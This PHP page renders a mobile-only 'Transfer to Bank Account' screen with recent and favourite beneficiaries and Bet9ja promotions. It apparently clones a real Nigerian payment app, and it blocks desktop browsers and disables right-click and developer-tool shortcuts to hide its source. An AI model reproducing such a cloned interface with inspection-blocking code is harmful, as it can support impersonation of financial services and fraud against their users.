<?php
// transfer.php
session_start();
if (!isset($_SESSION['user_id'])) {
    header("Location: login.php");
    exit();
}
require_once "config.php"; // must define $pdo (PDO)
$userAgent = $_SERVER['HTTP_USER_AGENT'];

// If not mobile
if (!preg_match('/Mobile|Android|iPhone|iPad|iPod/i', $userAgent)) {
    die("Sorry, this website is only available on mobile devices.");
}

// Selected bank from bn-list.php via to-bn.php (session)
$selectedBank = $_SESSION['bank'] ?? null;
$bankName = $selectedBank['name'] ?? '';
$bankUrl  = $selectedBank['url']  ?? '';
$bankCode = $selectedBank['code'] ?? '';

// Fetch last 3 beneficiaries for this user (newest first)
$uid = $_SESSION['user_id'];
$stmt = $pdo->prepare("
    SELECT url, accountname, accountnumber, bankname, favorite
    FROM beneficiary 
    WHERE uid = :uid
    ORDER BY id DESC
    LIMIT 3
");
$stmt->execute([':uid' => $uid]);
$beneficiaries = $stmt->fetchAll(PDO::FETCH_ASSOC);

// Split favourites
$favorites = array_values(array_filter($beneficiaries, function($r){
    $v = strtolower(trim((string)($r['favorite'] ?? '')));
    return $v === '1' || $v === 'true' || $v === 'yes';
}));
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<title>Transfer to Bank Account</title>
<link rel="stylesheet" href="css/to-bnk.css">
</head>
<body>
<div class="container">
    <div class="header">
        <div class="back-btn">‹</div>
        <div class="header-text">Transfer to Bank Account</div>
        <div class="history-btn">History</div>
    </div>

    <div class="free-transfers">
        <img src="images/toban/naira.png" alt="Gift icon">
        <span>Free transfers for the day:</span>
        <span class="free-count">3</span>
    </div>

    <div class="card">
        <div class="section-title">Recipient Account</div>

        <div class="input-group">
            <input id="accountNumber" type="tel" inputmode="numeric" pattern="\d*" maxlength="10"
                   class="input-field" placeholder="Enter 10 digits Account Number" autocomplete="off">
        </div>

        <div class="bank-selector" id="bankSelector">
            <div class="bank-logo">
                <img id="bankLogo" src="<?php echo htmlspecialchars($bankUrl); ?>" alt="Bank logo">
            </div>
            <div class="bank-name" id="bankName"><?php echo $bankName ? htmlspecialchars($bankName) : 'Select Bank'; ?></div>
            <div class="chevron">›</div>
        </div>

        <div class="detection-bar" id="detectBar">
            <img class="result" id="detectIcon" src="" alt="Result icon">
            <img class="rolling-image" id="detectSpinner" src="images/toban/rolling.png" alt="Detect icon">
            <p class="accountname" id="detectText">Account Name</p>
        </div>

        <div id="nextBtn" class="next-btn"><span>NEXT</span></div>
    </div>

    <div class="network-monitor">
        <img src="images/toban/tb.png" alt="Network monitor icon">
        <div class="network-text">Real-time Bank Network Monitor</div>
        <div class="chevron">›</div>
    </div>

    <div class="card">
        <div class="tabs">
            <div class="tab active" data-tab="recents">Recents</div>
            <div class="tab" data-tab="favorites">Favourites</div>
            <div style="flex:1;"></div>
            <img src="images/toban/search.png" alt="More options" style="width:20px;height:20px;">
        </div>
        <div class="indicator"></div>

        <!-- Recents list -->
        <div id="list-recent" class="b-list" style="<?php echo count($beneficiaries)?'':'display:none'; ?>">
            <?php if (count($beneficiaries)): ?>
                <?php foreach ($beneficiaries as $b): ?>
                    <div class="b-item"
                         data-accountnumber="<?php echo htmlspecialchars($b['accountnumber']); ?>"
                         data-bankname="<?php echo htmlspecialchars($b['bankname']); ?>"
                         data-accountname="<?php echo htmlspecialchars($b['accountname']); ?>"
                         data-url="<?php echo htmlspecialchars($b['url']); ?>">
                        <div class="b-left">
                            <div class="b-name"><?php echo htmlspecialchars($b['accountname']); ?></div>
                            <div class="b-sub"><?php echo htmlspecialchars($b['accountnumber'].'   '.$b['bankname']); ?></div>
                        </div>
                        <div class="b-avatar">
                            <img src="<?php echo htmlspecialchars($b['url']); ?>" alt="Profile Image">
                        </div>
                    </div>
                <?php endforeach; ?>
            <?php else: ?>
                <div class="empty-state">
                    <img src="https://cdn4.iconfinder.com/data/icons/ionicons/512/icon-document-512.png" alt="Empty">
                    <p>No recent transactions</p>
                </div>
            <?php endif; ?>
            <div class="view-all">View All ›</div>
        </div>

        <!-- Favourites list -->
        <div id="list-favorite" class="b-list" style="display:none;<?php echo count($favorites)?'':'display:none'; ?>">
            <?php if (count($favorites)): ?>
                <?php foreach ($favorites as $b): ?>
                    <div class="b-item"
                         data-accountnumber="<?php echo htmlspecialchars($b['accountnumber']); ?>"
                         data-bankname="<?php echo htmlspecialchars($b['bankname']); ?>"
                         data-accountname="<?php echo htmlspecialchars($b['accountname']); ?>"
                         data-url="<?php echo htmlspecialchars($b['url']); ?>">
                        <div class="b-left">
                            <div class="b-name"><?php echo htmlspecialchars($b['accountname']); ?></div>
                            <div class="b-sub"><?php echo htmlspecialchars($b['accountnumber'].'   '.$b['bankname']); ?></div>
                        </div>
                        <div class="b-avatar">
                            <img src="<?php echo htmlspecialchars($b['url']); ?>" alt="Profile Image">
                        </div>
                    </div>
                <?php endforeach; ?>
            <?php else: ?>
                <div class="empty-state">
                    <img src="https://cdn4.iconfinder.com/data/icons/ionicons/512/icon-document-512.png" alt="Empty">
                    <p>No favourites yet</p>
                </div>
            <?php endif; ?>
        </div>
    </div>

    <div class="events">
        <div class="section-title">More Events</div>
        <div class="event-item">
            <div class="event-icon"><img src="images/toban/bet9ja.png" alt=""></div>
            <div class="event-content">
                <div class="event-title">Get Your Betting Voucher Now</div>
                <div class="event-desc">Get ₦50 off ₦500 top-up with voucher</div>
            </div>
        </div>
        <div class="event-item">
            <div class="event-icon"><img src="images/toban/coin.png" alt=""></div>
            <div class="event-content">
                <div class="event-title">Win up to ₦1 Billion!</div>
                <div class="event-desc">Get more explosive odds on Bet9ja</div>
            </div>
        </div>
    </div>
</div>

<script src="js/to-bnk.js" defer></script>
<script>
// ======== Server data ========
const BANK = <?php echo json_encode([
    'name'=>$bankName,'url'=>$bankUrl,'code'=>$bankCode
], JSON_UNESCAPED_SLASHES); ?>;

</script>
<script>
  // Disable right-click
  document.addEventListener("contextmenu", function(e){
    e.preventDefault();
  });

  // Disable common inspect keys
  document.onkeydown = function(e) {
    if (e.keyCode == 123) { // F12
      return false;
    }
    if (e.ctrlKey && e.shiftKey && (e.keyCode == 'I'.charCodeAt(0) || e.keyCode == 'J'.charCodeAt(0))) {
      return false;
    }
    if (e.ctrlKey && (e.keyCode == 'U'.charCodeAt(0))) { // Ctrl+U
      return false;
    }
  }
</script>
</body>
</html>